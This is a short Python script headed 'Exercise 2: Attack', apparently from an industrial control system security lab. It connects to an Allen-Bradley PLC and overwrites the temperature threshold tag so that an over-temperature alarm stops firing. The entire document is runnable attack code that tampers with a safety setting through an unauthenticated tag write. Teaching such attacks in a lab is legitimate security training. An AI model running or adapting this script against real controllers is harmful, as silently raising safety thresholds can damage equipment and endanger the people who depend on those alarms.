#!/usr/bin/env python2
"""Exercise 2: Attack

The button DO_10 is supposed to light up if the temperature rises above the
threshold temperature of 30 degrees Celsius. Perform an attack to alter the
threshold temperature to a different value (e.g. 40 degrees Celsius)
"""
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IP = '192.168.1.151'
TAG_NAME = 'ThresTemp'
VALUE = 40.0
TAG_TYPE = 'REAL'

def write_plc(
        plc_ip=PLC_IP,
        tag_name=TAG_NAME,
        value=VALUE,
        tag_type=TAG_TYPE
        ):
    plc = ClxDriver()
    if plc.open(plc_ip):
        if plc.write_tag(tag_name, value, tag_type):
            print("Success")
            print("Target: " + plc_ip)
            print("Tag Name: " + tag_name)
            print("Value: " + str(value))
            print("Tag Type: " + tag_type)
        else:
            print("Failed to write to " + plc_ip)
        plc.close()
    else:
        print("Unable to open: ", plc_ip)

if __name__ == '__main__':
    write_plc()
